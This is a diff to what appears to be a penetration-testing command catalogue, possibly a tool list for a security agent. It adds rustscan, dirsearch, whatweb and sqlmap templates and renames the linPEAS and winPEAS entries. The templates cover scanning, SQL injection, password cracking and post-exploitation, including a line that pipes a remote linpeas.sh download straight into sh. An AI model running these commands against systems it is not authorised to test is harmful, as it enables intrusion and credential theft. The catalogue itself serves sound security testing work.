@@ -139,16 +139,20 @@ RECON:
   nmap:          nmap {target} -p{ports} -sV
   masscan:       masscan {target} -p{ports} --rate=10000
   netcat:        nc -v {target} {port}
+  rustscan:      rustscan -b {batch_size} -t {timeout} {target}
 
 WEB DISCOVERY:
   gobuster:      gobuster dir -u {url} -w {wordlist} -t {threads}
   ffuf:          ffuf -u {url}/FUZZ -w {wordlist} -mc {status_codes}
+  dirsearch:     dirsearch -u {url} -e {extensions} -w {wordlist}
   nikto:         nikto -h {url}
   nuclei:        nuclei -u {url} -t {templates}
+  whatweb:       whatweb {url}
 
 WEB EXPLOITATION:
   curl:          curl -X {method} -H {headers} -d '{body}' {url}
   wget:          wget {url} -O {output_file}
+  sqlmap:        sqlmap -u {url} --batch --dbs
 
 CREDENTIAL ATTACKS:
   john:          john --wordlist={wordlist} {hash_file}
@@ -160,8 +164,8 @@ EXPLOIT FRAMEWORKS:
   msfconsole:    msfconsole -q -x '{command}'
 
 POST-EXPLOITATION:
-  linPEAS:       curl {target}/linpeas.sh | sh
-  winPEAS:       winPEASx64.exe
+  linpeas:       curl {target}/linpeas.sh | sh
+  winpeas:       winPEASx64.exe
   enum4linux:    enum4linux {target}
   smbclient:     smbclient //{target}/{share} -U {username}
   ldapsearch:    ldapsearch -H ldap://{target} -D "{dn}" -w "{password}"
